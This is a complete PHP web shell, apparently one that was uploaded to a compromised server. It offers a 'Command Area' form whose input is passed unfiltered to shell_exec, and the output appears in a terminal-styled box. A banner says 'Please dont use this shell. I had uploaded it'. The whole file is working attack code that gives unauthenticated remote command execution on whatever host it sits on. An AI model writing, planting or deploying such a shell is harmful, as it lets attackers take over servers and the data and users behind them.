<?php
echo "<br/><h4>Please dont use this shell. I had uploaded it</h4>";
echo "<form method='post' action='9090909090101010101010.php'>
<h3>Command Area</h3>
<textarea name='cmd' style='width:100%;height:20%'></textarea>
<br/>
<br/>
<input type=submit value=Run style='background-color: f44336;
    border: none;
    color: white;
    padding: 5px 20px;
    text-align: center;
    text-decoration: none;
    display: inline-block;
    font-size: 16px;
    margin: 4px 2px;
    cursor: pointer;'></input>
</form>";
if ($_POST['cmd'] == null)
{
	$output = shell_exec('echo "Hello World"');
}
else
{
	$output = shell_exec($_POST['cmd'].' 2>&1');
}
echo "<textarea disabled style=';color:  	#7FFF00;
    width: 100%;
    height: 100%;
    padding: 12px 20px;
    box-sizing: border-box;
    font-size: 16px;
    border: 2px solid black;
    border-radius: 4px;
    background-color: black;
    resize: none;''>$output</textarea>";

?>

